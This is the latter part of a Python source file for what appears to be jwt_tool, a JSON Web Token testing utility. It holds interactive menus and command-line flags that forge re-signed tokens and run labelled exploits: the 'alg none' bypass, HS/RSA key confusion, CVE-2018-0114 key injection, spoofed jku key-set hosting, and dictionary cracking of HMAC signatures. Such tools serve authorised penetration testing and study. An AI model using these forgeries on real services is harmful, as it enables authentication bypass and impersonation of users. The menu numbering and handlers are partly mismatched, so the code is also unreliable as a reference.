                print("\nPlease enter the filename of the RSA Private Key:")
                privKeyName = input("> ")
            else:
                print("Invalid selection")
                exit(1)
            print("\nPlease enter the keylength:")
            print("[1] RSA-256")
            print("[2] RSA-384")
            print("[3] RSA-512")
            try:
                selLength = int(input("> "))
            except:
                print("Invalid selection")
                exit(1)
            if selLength == 1:
                keyLength = 256
            elif selLength == 2:
                keyLength = 384
            elif selLength == 3:
                keyLength = 512
            else:
                print("Invalid selection")
                exit(1)
            newSig, badSig, newContents = signTokenRSA(headDict, paylDict, privKeyName, keyLength)
            print("\nYour new forged token:")
            print("[+] URL safe: "+newContents+"."+newSig)
            print("[+] Standard: "+newContents+"."+badSig+"\n")
            exit(1)
        elif selLength == 2:
            print("\nPlease select an option:")
            print("[1] Generate new ECDSA key pair")
            print("[2] Use existing ECDSA Private Key")
            try:
                selLength = int(input("> "))
            except:
                print("Invalid selection")
                exit(1)
            if selLength == 1:
                nowtime = str(int(datetime.datetime.now().timestamp()))
                pubKey, privKey = newECKeyPair()
                privKeyName = "private_jwttool_EC_"+nowtime+".pem"
                pubKeyName = "public_jwttool_EC_"+nowtime+".pem"
                with open(privKeyName, 'w') as test_priv_out:
                    test_priv_out.write(privKey)
                with open(pubKeyName, 'w') as test_pub_out:
                    test_pub_out.write(pubKey)
                print("\nKey pair created and exported as:\n"+pubKeyName+"\n"+privKeyName+"\n")
            elif selLength == 2:
                print("\nPlease enter the filename of the ECDSA Private Key:")
                privKeyName = input("> ")
            else:
                print("Invalid selection")
                exit(1)
            print("\nPlease enter the keylength:")
            print("[1] ECDSA-256")
            print("[2] ECDSA-384")
            print("[3] ECDSA-512")
            try:
                selLength = int(input("> "))
            except:
                print("Invalid selection")
                exit(1)
            if selLength == 1:
                keyLength = 256
            elif selLength == 2:
                keyLength = 384
            elif selLength == 3:
                keyLength = 512
            else:
                print("Invalid selection")
                exit(1)
            newSig, badSig, newContents = signTokenEC(headDict, paylDict, privKeyName, keyLength)
            print("\nYour new forged token:")
            print("[+] URL safe: "+newContents+"."+newSig)
            print("[+] Standard: "+newContents+"."+badSig+"\n")
            exit(1)
        elif selLength == 3:
            print("\nPlease select an option:")
            print("[1] Generate new RSA key pair")
            print("[2] Use existing RSA Private Key")
            try:
                selLength = int(input("> "))
            except:
                print("Invalid selection")
                exit(1)
            if selLength == 1:
                nowtime = str(int(datetime.datetime.now().timestamp()))
                pubKey, privKey = newRSAKeyPair()
                privKeyName = "private_jwttool_RSA_"+nowtime+".pem"
                pubKeyName = "public_jwttool_RSA_"+nowtime+".pem"
                with open(privKeyName, 'w') as test_priv_out:
                    test_priv_out.write(privKey.decode())
                with open(pubKeyName, 'w') as test_pub_out:
                    test_pub_out.write(pubKey.decode())
                print("\nKey pair created and exported as:\n"+pubKeyName+"\n"+privKeyName+"\n")
            elif selLength == 2:
                print("\nPlease enter the filename of the RSA Private Key:")
                privKeyName = input("> ")
            else:
                print("Invalid selection")
                exit(1)
            print("\nPlease enter the keylength:")
            print("[1] RSA-256")
            print("[2] RSA-384")
            print("[3] RSA-512")
            try:
                selLength = int(input("> "))
            except:
                print("Invalid selection")
                exit(1)
            if selLength == 1:
                keyLength = 256
            elif selLength == 2:
                keyLength = 384
            elif selLength == 3:
                keyLength = 512
            else:
                print("Invalid selection")
                exit(1)
            newSig, badSig, newContents = signTokenPSS(headDict, paylDict, privKeyName, keyLength)
            print("\nYour new forged token:")
            print("[+] URL safe: "+newContents+"."+newSig)
            print("[+] Standard: "+newContents+"."+badSig+"\n")
            exit(1)
        else:
            print("Invalid selection")
            exit(1)
    elif selection == 3:
        print("\nStripped Signature")
        tok2 = base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
        checkAlgNone(headDict, tok2)
        exit(1)
    elif selection == 4:
        tok2 = base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
        try:
            checkPubKey(headDict, tok2, pubKey)
        except:
            print("\nPlease enter the Public Key filename:")
            pubKey = input("> ")
            checkPubKey(headDict, tok2, pubKey)
        exit(1)
    if selection == 5:
        print("\nPlease enter the key file's filename:")
        keyFile = input("> ")
        print("\nLoading key file...")
        try:
            key1 = open(keyFile).read()
        except:
            print("Could not load file")
            exit(1)
        print("File loaded: "+keyFile)
        print("\nPlease enter the keylength:")
        print("[1] HMAC-SHA256")
        print("[2] HMAC-SHA384")
        print("[3] HMAC-SHA512")
        try:
            selLength = int(input("> "))
        except:
            print("Invalid selection")
            exit(1)
        if selLength == 1:
            keyLength = 256
        elif selLength == 2:
            keyLength = 384
        elif selLength == 3:
            keyLength = 512
        else:
            print("Invalid selection")
            exit(1)
        newSig, badSig, newContents = signToken(headDict, paylDict, key1, keyLength)
        print("\nYour new forged token:")
        print("[+] URL safe: "+newContents+"."+newSig)
        print("[+] Standard: "+newContents+"."+badSig+"\n")
        exit(1)
    elif selection == 6:
        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
        newSig, badSig, newContents = jwksEmbed(headDict, paylDict)
        print("\nYour new forged token:")
        print("[+] "+newContents+"."+sig)
        exit(1)
    elif selection == 7:
        print("\nPlease select an option:")
        print("[1] Generate new RSA key pair")
        print("[2] Use existing RSA Private Key")
        try:
            selLength = int(input("> "))
        except:
            print("Invalid selection")
            exit(1)
        if selLength == 1:
            privateKey = ""
        elif selLength == 2:
            print("\nPlease enter the Private Key filename:")
            privateKey = input("> ")
            print("\nLoading Private Key file...")
            try:
                keytest = open(privateKey).read()
            except:
                print("Could not load file")
                exit(1)
        else:
            print("Invalid selection")
            exit(1)
        print("\nPlease enter the full URL where you will host the JWKS file:")
        jku = input("> ")
        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
        try:
            kid = headDict["kid"]
            newSig, badSig, newContents, newjwks, privKeyName, jwksName = jwksGen(headDict, paylDict, jku, privateKey, kid)
        except:
            kid = ""
            newSig, badSig, newContents, newjwks, privKeyName, jwksName = jwksGen(headDict, paylDict, jku, privateKey)
        print("\nYour new forged token:")
        print("(Signed with: "+privKeyName+")")
        print("[+] "+newContents+"."+newSig)
        print("\nPaste this JWKS into a new file at the following location: "+jku)
        print("(Also exported as: "+jwksName+")")
        print("[+]\n"+str(newjwks))
        exit(1)
    elif selection == 8:
        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
        print("\nYour new forged token:")
        print("[+] "+newContents+"."+sig)
        exit(1)
    else:
        exit(1)

def dissectPayl(paylDict, count=False):
    timeseen = 0
    comparestamps = []
    countval = 0
    expiredtoken = False
    nowtime = int(datetime.datetime.now().timestamp())
    for claim in paylDict:
        countval += 1
        if count:
            placeholder = str(countval)
        else:
            placeholder = "+"
        if claim in ["exp", "nbf", "iat"]:
            timestamp = datetime.datetime.fromtimestamp(int(paylDict[claim]))
            if claim == "exp":
                if int(timestamp.timestamp()) < nowtime:
                    expiredtoken = True
            print("["+placeholder+"] "+claim+" = "+str(paylDict[claim])+"    ==> TIMESTAMP = "+timestamp.strftime('%Y-%m-%d %H:%M:%S')+" (UTC)")
            timeseen += 1
            comparestamps.append(claim)
        else:
            print("["+placeholder+"] "+claim+" = "+str(paylDict[claim]))
    return comparestamps, expiredtoken

def validateToken():
    try:
        tok1, tok2, sig = jwt.split(".",3)
        sig = base64.urlsafe_b64encode(base64.urlsafe_b64decode(sig + "=" * (-len(sig) % 4))).decode('UTF-8').strip("=")
        contents = tok1+"."+tok2
        contents = contents.encode()
        head = base64.b64decode(tok1 + "=" * (-len(tok1) % 4))
        payl = base64.b64decode(tok2 + "=" * (-len(tok2) % 4))
        headDict = json.loads(head.decode("utf-8"), object_pairs_hook=OrderedDict)
        paylDict = json.loads(payl.decode("utf-8"), object_pairs_hook=OrderedDict)
    except:
        print("Oh noes! Invalid token")
        exit(1)
    return headDict, paylDict, sig, contents

def exploreToken(headDict, paylDict):
    print("\n=====================\nExamine Token Values:\n=====================")
    claims = 0
    for claim in headDict:
        if claim == "jku":
            print("\n[+] jku: The 'JWKS URL' claim in the header is used to define the location of a JWKS file - a JSON file that stores signing key data. The main vulnerabilities here are:\n     [*] the JWKS could contain private key data\n     [*] the URL could be tampered with to point to a malicious JWKS\n     [*] tampering a URL could force a lookup, leading to SSRF conditions")
            claims += 1
        elif claim == "kid":
            print("\n[+] kid: The 'key ID' claim in the header identifies the key used for signing the token. This could be a key stored in a JWKS file at an externally-accessible URL (especially one named in a 'jku' claim), a similarly-named public key on the server's file system, a JWKS file on the server's file system, or within a JWKS file somewhere accessible only to the server. The main vulnerabilities here are tampering the value to:\n     [*] prompt verbose errors\n     [*] redirect to an alternative internal file to use for signing\n     [*] perform command injection\n     [*] perform other injection attacks")
            claims += 1
        elif claim == "x5u":
            print("\n[+] x5u: The 'x509 Certificate URL' claim in the header is used to define the location of an x509 Certificate, used to sign the token - usually stored within a JWKS file that stores signing key data. The main vulnerabilities here are:\n     [*] the x509 could contain sensitive data\n[*] the URL could be tampered with to point to a malicious x509 Certificate\n     [*] tampering a URL could force a lookup, leading to SSRF conditions")
            claims += 1
    for claim in paylDict:
        if claim == "iss":
            print("\n[+] iss: The 'issuer' claim in the payload is used to define the 'principal' that issued the JWT. The main vulnerabilities here are:\n     [*] a URL that reveals sensitive data.\n     [*] tampering a URL could force a lookup, leading to SSRF conditions")
            claims += 1
    if claims == 0:
        print("\nNo commonly-known vulnerable claims identified.\n")

def rejigToken(headDict, paylDict, sig):
    print("\n=====================\nDecoded Token Values:\n=====================")
    print("\nToken header values:")
    for claim in headDict:
        if isinstance(headDict[claim], dict):
            print("[+] "+claim+" = JSON object:")
            for subclaim in headDict[claim]:
                print("    [+] "+subclaim+" = "+str(headDict[claim][subclaim]))
        else:
            print("[+] "+claim+" = "+str(headDict[claim]))
    print("\nToken payload values:")
    comparestamps, expiredtoken = dissectPayl(paylDict)
    if len(comparestamps) >= 2:
        print("\nSeen timestamps:")
        print("[*] "+comparestamps[0]+" was seen")
        claimnum = 0
        for claim in comparestamps:
            timeoff = int(paylDict[comparestamps[claimnum]])-int(paylDict[comparestamps[0]])
            if timeoff != 0:
                if timeoff < 0:
                    timeoff = timeoff*-1
                    prepost = "[-] "+claim+" is earlier than "+comparestamps[0]+" by: "
                else:
                    prepost = "[+] "+claim+" is later than "+comparestamps[0]+" by: "
                timecalc = timeoff
                days,hours,mins = 0,0,0
                if timecalc >= 86400:
                    days = str(timecalc/86400)
                    days = int(float(days))
                    timecalc -= days*86400
                if timecalc >= 3600:
                    hours = str(timecalc/3600)
                    hours = int(float(hours))
                    timecalc -= hours*3600
                if timecalc >= 60:
                    mins = str(timecalc/60)
                    mins = int(float(mins))
                    timecalc -= mins*60
                print(prepost+str(days)+" days, "+str(hours)+" hours, "+str(mins)+" mins")
            claimnum += 1
    if expiredtoken:
        print("[-] TOKEN IS EXPIRED!")
    print("\n----------------------\nJWT common timestamps:\niat = IssuedAt\nexp = Expires\nnbf = NotBefore\n----------------------")
    return headDict, paylDict, sig

if __name__ == '__main__':
# Print logo
    print()
    print("   $$$$$\ $$\      $$\ $$$$$$$$\  $$$$$$$$\                  $$\ ")
    print("   \__$$ |$$ | $\  $$ |\__$$  __| \__$$  __|                 $$ |")
    print("      $$ |$$ |$$$\ $$ |   $$ |       $$ | $$$$$$\   $$$$$$\  $$ |")
    print("      $$ |$$ $$ $$\$$ |   $$ |       $$ |$$  __$$\ $$  __$$\ $$ |")
    print("$$\   $$ |$$$$  _$$$$ |   $$ |       $$ |$$ /  $$ |$$ /  $$ |$$ |")
    print("$$ |  $$ |$$$  / \$$$ |   $$ |       $$ |$$ |  $$ |$$ |  $$ |$$ |")
    print("\$$$$$$  |$$  /   \$$ |   $$ |       $$ |\$$$$$$  |\$$$$$$  |$$ |")
    print(" \______/ \__/     \__|   \__|$$$$$$\\__| \______/  \______/ \__|")
    print(" Version 1.3.2                \______|                           ")
    print()

    parser = argparse.ArgumentParser(epilog="If you don't have a token, try this one:\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("jwt", type=str,
                        help="the JWT to tinker with")
    parser.add_argument("-R", "--readtoken", action="store_true",
                        help="read and analyse JWT contents")
    parser.add_argument("-X", "--explore", action="store_true",
                        help="eXplore the potential issues with a token")
    parser.add_argument("-T", "--tamper", action="store_true",
                        help="tamper with the JWT contents")
    parser.add_argument("-C", "--crack", action="store_true",
                        help="crack key for an HMAC-SHA token")
    parser.add_argument("-J", "--jwkscheck", action="store_true",
                        help="validate and process a JWKS file")
    parser.add_argument("-A", "--algnone", action="store_true",
                        help="EXPLOIT: test the \"alg\": \"none\" vulnerability")
    parser.add_argument("-K", "--keyconf", action="store_true",
                        help="EXPLOIT: test the HMAC-SHA/RSA key confusion vulnerability")
    parser.add_argument("-I", "--injectjwk", action="store_true",
                        help="EXPLOIT: inject a key and self-sign the token (CVE-2018-0114)")
    parser.add_argument("-S", "--spoofjwk", action="store_true",
                        help="EXPLOIT: self-sign a key and output a JWKS ")
    parser.add_argument("-V", "--verify", action="store_true",
                        help="verify the RSA signature against a Public Key")
    parser.add_argument("-d", "--dict", action="store",
                        help="dictionary file for cracking")
    parser.add_argument("-p", "--password", action="store",
                        help="password for cracking")
    parser.add_argument("-k", "--keyfile", action="store",
                        help="keyfile for cracking")
    parser.add_argument("-pk", "--pubkey", action="store",
                        help="Public Key for Asymmetric crypto")
    parser.add_argument("-pr", "--privatekey", action="store",
                        help="Private Key for Asymmetric crypto")
    parser.add_argument("-jw", "--jwksfile", action="store",
                        help="JSON Web Key Store for Asymmetric crypto")
    parser.add_argument("-u", "--urlinject", action="store",
                        help="URL location where you can host a spoofed JWKS")
    args = parser.parse_args()
    jwt = args.jwt
    key = ""
    pubKey = ""
    privateKey = ""
    keyList = ""
    keyFile = ""
    jwksfile = ""
    urlinject = ""
    headDict, paylDict, sig, contents = validateToken()
    tok2 = base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    if args.dict:
        keyList = args.dict
    if args.keyfile:
        keyFile = args.keyfile
    if args.password:
        key = args.password
    if args.pubkey:
        pubKey = args.pubkey
    if args.privatekey:
        privateKey = args.privatekey
    if args.jwksfile:
        jwksfile = args.jwksfile
    if args.urlinject:
        urlinject = args.urlinject

# menu from args
    if args.tamper:
        tamperToken(paylDict, headDict, sig)
        exit(1)
    if args.verify:
        algType = headDict["alg"][0:2]
        if algType == "RS":
            if pubKey:
                verifyTokenRSA(headDict, paylDict, sig, pubKey)
            else:
                print("No Public Key provided (-pk)\n")
                parser.print_usage()
            exit(1)
        elif algType == "ES":
            if pubKey:
                verifyTokenEC(headDict, paylDict, sig, pubKey)
            else:
                print("No Public Key provided (-pk)\n")
                parser.print_usage()
            exit(1)
        elif algType == "PS":
            if pubKey:
                verifyTokenPSS(headDict, paylDict, sig, pubKey)
            else:
                print("No Public Key provided (-pk)\n")
                parser.print_usage()
            exit(1)
        else:
            print("Algorithm not supported for verification")
            exit(1)
    if args.readtoken:
        rejigToken(headDict, paylDict, sig)
        exit(1)
    if args.explore:
        rejigToken(headDict, paylDict, sig)
        exploreToken(headDict, paylDict)
        exit(1)
    if args.jwkscheck:
        if jwksfile:
            parseJWKS(jwksfile)
        else:
            print("No JWKS file provided (-jw)\n")
            parser.print_usage()
        exit(1)
    if args.algnone:
        checkAlgNone(headDict, tok2)
        exit(1)
    if args.injectjwk:
        newSig, badSig, newContents = jwksEmbed(headDict, paylDict)
        print("[+] New injected token: "+newContents+"."+newSig)
        exit(1)
    if args.spoofjwk:
        if urlinject:
            jku = urlinject
            try:
                kid = headDict["kid"]
                newSig, badSig, newContents, newjwks, privKeyName, jwksName = jwksGen(headDict, paylDict, jku, privateKey, kid)
            except:
                kid = ""
                newSig, badSig, newContents, newjwks, privKeyName, jwksName = jwksGen(headDict, paylDict, jku, privateKey)
            print("\nYour new forged token:")
            print("(Signed with: "+privKeyName+")")
            print("[+] "+newContents+"."+newSig)
            print("\nPaste this JWKS into a new file at the following location: "+jku)
            print("(Also exported as: "+jwksName+")")
            print("[+]\n"+str(newjwks))
            exit(1)
        else:
            print("No URL provided to spoof the JWKS (-u)\n")
            parser.print_usage()
        exit(1)
    if args.keyconf:
        if pubKey:
            checkPubKey(headDict, tok2, pubKey)
        else:
            print("No Public Key provided (-pk)\n")
            parser.print_usage()
        exit(1)
    if args.crack:
        if args.password:
            print("Password provided, checking if valid...")
            checkSig(sig, contents, key)
        elif args.dict:
            crackSig(sig, contents)
        elif args.keyfile:
            checkSigKid(sig, contents)
        else:
            print("No cracking option supplied:\nPlease specify a password/dictionary/Public Key\n")
            parser.print_usage()
        exit(1)

# Show token deconstructed
    rejigToken(headDict, paylDict, sig)
# Main menu
    print("\n\n########################################################")
    print("#  Options:                                            #")
    print("#                ==== TAMPERING ====                   #")
    print("#  1: Tamper with JWT data (multiple signing options)  #")
    print("#                                                      #")
    print("#             ==== VULNERABILITIES ====                #")
    print("#  2: Check for the \"none\" algorithm vulnerability     #")
    print("#  3: Check for HS/RSA key confusion vulnerability     #")
    print("#  4: Check for JWKS key injection vulnerability       #")
    print("#                                                      #")
    print("#            ==== CRACKING/GUESSING ====               #")
    print("#  5: Check HS signature against a key (password)      #")
    print("#  6: Check HS signature against key file              #")
    print("#  7: Crack signature with supplied dictionary file    #")
    print("#                                                      #")
    print("#            ==== RSA KEY FUNCTIONS ====               #")
    print("#  8: Verify RSA signature against a Public Key        #")
    print("#                                                      #")
    print("#  0: Quit                                             #")
    print("########################################################")
    print("\nPlease make a selection (1-6)")
    try:
        selection = int(input("> "))
    except:
        print("Invalid selection")
        exit(1)
    if selection == 1:
        tamperToken(paylDict, headDict, sig)
    elif selection == 2:
        checkAlgNone(headDict, tok2)
    elif selection == 3:
        if not pubKey:
            print("\nPlease enter the Public Key filename:")
            pubKey = input("> ")
            checkPubKey(headDict, tok2, pubKey)
    elif selection == 4:
        newSig, badSig, newContents = jwksEmbed(headDict, paylDict)
        print("[+] New injected token: "+newContents+"."+newSig)
    elif selection == 5:
        checkSig(sig, contents, key)
    elif selection == 6:
        if keyFile != "":
            checkSigKid(sig, contents)
        else:
            print("Please provide filename for key file.\n")
            keyFile = input("> ")
            checkSigKid(sig, contents)
    elif selection == 7:
        if keyList != "":
            crackSig(sig, contents)
        else:
            print("Please provide filename for dictionary file.\n")
            keyList = input("> ")
            crackSig(sig, contents)
    elif selection == 8:
        algType = headDict["alg"][0:2]
        if algType == "RS":
            try:
                verifyTokenRSA(headDict, paylDict, sig, pubKeyName)
            except:
                print("Please provide filename for Public Key.\n")
                pubKeyName = input("> ")
                verifyTokenRSA(headDict, paylDict, sig, pubKeyName)
        elif algType == "ES":
            try:
                verifyTokenEC(headDict, paylDict, sig, pubKeyName)
            except:
                print("Please provide filename for Public Key.\n")
                pubKeyName = input("> ")
                verifyTokenEC(headDict, paylDict, sig, pubKeyName)
        else:
            print("Algorithm not supported for verification")
            exit(1)
    else:
        exit(1)
    exit(1)
